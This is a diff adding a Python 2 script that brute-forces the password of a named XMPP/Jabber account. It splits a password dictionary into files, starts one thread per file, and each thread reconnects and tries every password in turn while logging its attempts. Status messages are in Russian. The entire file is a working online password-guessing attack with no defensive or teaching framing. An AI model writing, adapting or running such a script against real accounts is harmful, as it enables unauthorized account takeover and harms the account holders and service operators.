@@ -1,0 +1,69 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+import xmpp
+import sys
+import time
+import threading
+
+res = 0
+
+target_jid = "fosser@jabber.org"
+passwd = '1'
+log_file = 'brut_' + target_jid
+passwd_file = '/home/philosoft/passwds.dat'
+dicts = ['xaa', 'xab', 'xac', 'xad', 'xae', 'xaf', 'xag', 'xah', 'xai', 'xaj', 'xak']
+
+class brut(threading.Thread):
+    def __init__(self, dic):
+        self.dic = dic
+        threading.Thread.__init__(self)
+
+    def run(self, ):
+        print "Подготавливаемся..."
+        try:
+            p_file = open(self.dic, "r")
+        except IOError, e:
+            print e.filename + ': ' + e.strerror
+            sys.exit()
+
+        try:
+            log = open(log_file + '_' + self.dic, "a")
+        except IOError, e:
+            print e.filename + ': ' + e.strerror
+            sys.exit()
+
+        jid = xmpp.JID(target_jid)
+        user = jid.getNode()
+        cl = xmpp.Client(jid.getDomain(), debug = [])
+        if cl.connect() == '':
+            print "А не приконектилось"
+            sys.exit()
+        print "Поехали"
+        passwd = p_file.readline()
+        print "Trying %s" %passwd
+        auth_res = cl.auth(user, passwd)
+
+        while not auth_res and passwd <> '' and not res:
+            try:
+                log.write(str(passwd))
+                log.flush()
+            except IOError, e:
+                print e.filename + ': ' + e.strerror
+
+            passwd = p_file.readline()
+            print "Trying %s" %passwd
+            cl.disconnect()
+            del cl
+            cl = xmpp.Client(jid.getDomain(), debug = [])
+            cl.connect()
+            auth_res = cl.auth(user, passwd)
+
+        if auth_res:
+            res = 1
+
+
+for i in dicts:
+    brut(i).start()
+
+print "Passwd is %s or we just do NOT find it" %passwd
